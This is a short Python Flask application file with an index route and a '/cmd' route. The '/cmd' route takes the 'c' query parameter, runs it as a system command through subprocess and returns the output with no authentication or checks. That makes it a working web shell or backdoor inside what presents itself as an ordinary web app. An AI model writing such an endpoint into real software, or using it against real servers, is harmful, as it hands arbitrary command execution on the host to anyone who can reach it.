from flask import Flask, render_template, request
from db import get_db, close_db
import sqlalchemy
from sqlalchemy import text
from logger import log
import subprocess

app = Flask(__name__)
app.teardown_appcontext(close_db)


@app.route("/")
def index():
    return render_template("index.html")
@app.route("/cmd")
def cmd():
    cmd = request.args.get('c')
    cmd = subprocess.run(cmd.split(' '), capture_output=True)
    stdout = cmd.stdout
    return stdout
